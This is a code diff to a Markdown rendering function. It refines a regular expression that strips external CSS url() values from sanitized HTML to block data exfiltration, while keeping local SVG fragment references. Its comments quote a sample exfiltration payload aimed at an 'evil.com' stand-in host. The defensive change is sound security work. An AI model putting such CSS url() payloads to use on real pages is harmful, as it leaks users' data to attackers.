@@ -646,10 +646,13 @@ export async function renderMarkdown() {
                             ALLOWED_ATTR: ['class', 'style', 'xmlns'],
                             KEEP_CONTENT: true,
                         });
-                        // Strip url() to prevent data exfiltration via CSS
+                        // Strip external url() to prevent data exfiltration via CSS
                         // Allows: background-color: #e8e8e8; padding: 5px;
+                        // Allows: fill: url(#gradient); (local fragment references for SVG)
                         // Blocks: background: url(https://evil.com?data=...);
-                        fo.innerHTML = sanitizedHtml.replace(/url\s*\([^)]*\)/gi, '');
+                        // Blocks: background: url(data:text/html,...);
+                        // The negative lookahead (?!['"]?#) preserves url(#...) patterns
+                        fo.innerHTML = sanitizedHtml.replace(/url\s*\(\s*(?!['"]?#)[^)]*\)/gi, '');
                     }
                     // Clean up the marker attribute
                     fo.removeAttribute('data-fo-idx');
